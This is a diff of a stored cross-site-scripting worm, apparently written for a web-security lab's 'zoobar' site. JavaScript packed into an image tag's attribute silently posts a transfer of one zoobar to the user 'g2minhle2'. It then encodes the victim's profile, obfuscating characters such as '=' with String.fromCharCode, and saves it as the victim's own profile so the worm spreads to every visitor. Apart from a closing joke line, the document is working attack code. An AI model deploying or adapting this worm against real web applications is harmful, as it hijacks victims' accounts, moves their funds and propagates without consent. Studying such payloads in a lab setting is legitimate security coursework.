@@ -1,9 +1,22 @@
-<p id="zoobars" class='
+<img id="zoobars" class="
 	var xhttp = new XMLHttpRequest();
-	xhttp.open("POST", "transfer.php", false);
-	xhttp.send("zoobars=1&zb_recipient=g2minhle2&submission=Send");
-	var myProfile = document.getElementById("profile").innerHTML;	
+	xhttp.open('POST', 'transfer.php', false);
+	var formData = 'zoobars'+String.fromCharCode(61)+'1&zb_recipient'+String.fromCharCode(61)+'g2minhle2&submission'+String.fromCharCode(61)+'Send';
+	xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	xhttp.setRequestHeader('Content-Length', formData.length);
+	xhttp.send(formData);
+	var myProfile = document.getElementById('profile').innerHTML;	
 	xhttp = new XMLHttpRequest();
-	xhttp.open("POST", "index.php", false);
-	xhttp.send("profileupdate="+myProfile+"&profilesubmit=Save");
-'></p>
+	xhttp.open('POST', 'index.php', false);
+	myProfile = encodeURIComponent(myProfile).split('%20').join('+');
+	myProfile = myProfile.split(String.fromCharCode(39)).join('%27');
+	myProfile = myProfile.split('(').join('%28');
+	myProfile = myProfile.split(')').join('%29');
+	myProfile = myProfile.split('%0A').join('%0D%0A');
+	myProfile = myProfile.split('amp%3B').join('');	
+	formData='profileupdate'+String.fromCharCode(61)+ myProfile + '&profilesubmit'+String.fromCharCode(61)+'Save'
+	xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	xhttp.setRequestHeader('Content-Length', formData.length);
+	xhttp.send(formData);
+"/>
+Hofstadters Law: It always takes longer than you expect, even when you take into account Hofstadters Law.
